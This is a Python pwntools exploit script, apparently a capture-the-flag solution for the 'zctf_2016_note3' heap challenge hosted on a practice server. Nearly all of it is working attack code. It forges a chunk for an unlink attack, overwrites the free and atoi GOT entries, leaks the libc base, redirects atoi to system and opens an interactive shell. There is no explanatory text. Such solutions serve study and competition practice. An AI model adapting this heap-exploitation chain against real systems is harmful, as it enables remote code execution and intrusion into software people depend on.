# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'zctf_2016_note3'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 27467)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(size,content):
	p.sendlineafter('>>\n','1')
	p.sendlineafter('1024)\n',str(size))
	p.sendlineafter('content:\n',content)

def show():
	p.sendlineafter('>>\n','2')

def edit(idx,content):
	p.sendlineafter('>>\n','3')
	p.sendlineafter('note:\n',str(idx))
	p.sendlineafter('content:\n',content)

def delete(idx):
	p.sendlineafter('>>\n','4')
	p.sendlineafter('note:',str(idx))

lg=lambda address,data:log.success('%s: '%(address)+hex(data))

def exp():
	payload=p64(0)+p64(0xb1)+p64(0x6020c8-0x18)+p64(0x6020c8-0x10)
	add(0x90,payload) #0
	add(0x0,'bbbb') #1
	add(0x90,'cccc') #2 
	add(0x18,'dddd')
	delete(1)
	payload=p64(0)*2+p64(0xb0)+p64(0xa0)
	add(0,payload)
	delete(2)
	edit(0,p64(0)*2+p64(elf.got['free'])*2+p64(elf.got['atoi'])+p64(0)+p64(elf.got['atoi']))
	show()
	edit(0,p64(elf.plt['puts'])[:-1])
	delete(1)
	atoi=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	libcbase=atoi-libc.sym['atoi']
	lg('libcbase: ',libcbase)
	system=libcbase+libc.sym['system']
	edit(3,p64(system)[:-1])
	p.sendline('/bin/sh\x00')
	p.interactive()

if __name__=="__main__":
	exp()
